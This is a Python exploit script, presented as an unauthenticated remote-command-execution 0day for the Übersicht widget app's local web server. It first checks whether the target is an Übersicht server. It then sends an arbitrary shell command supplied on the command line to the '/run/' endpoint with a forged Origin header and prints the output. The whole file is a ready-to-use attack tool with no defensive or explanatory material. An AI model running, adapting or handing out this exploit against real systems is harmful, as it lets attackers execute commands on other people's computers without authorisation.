# Übersicht RCE 0day exploit by @BoofSec
# Date: 08/09/2021
# Author: cs
#  o Twitter: https://twitter.com/elordcs
#  o GitHub: https://github.com/ecriminal
#  o Discord: cs#0420

import requests
import argparse
import sys


# constants
DEFAULT_PORT = 41416
""" Default port of Übersicht HTTP webserver """


def exploit(host, port, command):
    """ Exploit RCE vulnerability at '/run/'
    
    Sends a POST request to endpoint '/run/' with
    the POST data being the wished OS shell command
    to be executed to trigger the remote command execution
    vulnerability on Übersicht's HTTP server.

    Args:
        host (str): target host
        port (int): target port
        command (str): os shell command to execute

    Returns:
        bool: exploit was executed successfully
    """
    res = requests.post(f'http://{host}:{port}/run/', data=command, headers={'Origin': f'http://{host}:{port}'})
    return res.text if res.status_code == 200 else None


def check(host, port):
    """ Check if target host is vulnerable to the RCE vulnerability
    
    Checks if the target host is vulnerable to 
    the Übersicht HTTP server remote command
    execution vulnerability.

    Args:
        host (str): target host
        port (int): target port

    Returns:
        bool: target host is vulnerable
    """
    res = requests.get(f'http://{host}:{port}')
    return '<div id="uebersicht"></div>' in res.text.lower()


if __name__ == '__main__':
    print('\x1b[31mÜbersicht\x1b[0m unauthenticated RCE 0day exploit by @BoofSec\nauthor: \x1b[32mcs#0420\x1b[0m\tdate: \x1b[33m08/09/2021\x1b[0m\n')

    parser = argparse.ArgumentParser()
    parser.add_argument('--host', help='target host address', dest='host', required=True)
    parser.add_argument('--port', help='target host port', dest='port', type=int, default=DEFAULT_PORT)
    parser.add_argument('--command', help='os shell command to execute', dest='command', required=True)

    if len(sys.argv) == 1:
        parser.print_help()
        sys.exit(0)

    args = parser.parse_args()

    print(f'[~] checking if {args.host}:{args.port} is vulnerable...')

    if check(args.host, args.port) is False:
        print(f'[-] {args.host}:{args.port} is not vulnerable', file=sys.stderr)
        sys.exit(1)

    print(f'[+] {args.host}:{args.port} appears to be vulnerable')

    output = exploit(args.host, args.port, args.command)

    if output is None:
        print(f'[-] exploit failed on {args.host}:{args.port}', file=sys.stderr)
        sys.exit(1)

    print(f'[+] exploit executed on {args.host}:{args.port}')
    print(f'[+] output of command `{args.command}`:\n\x1b[32m{output}\x1b[0m')
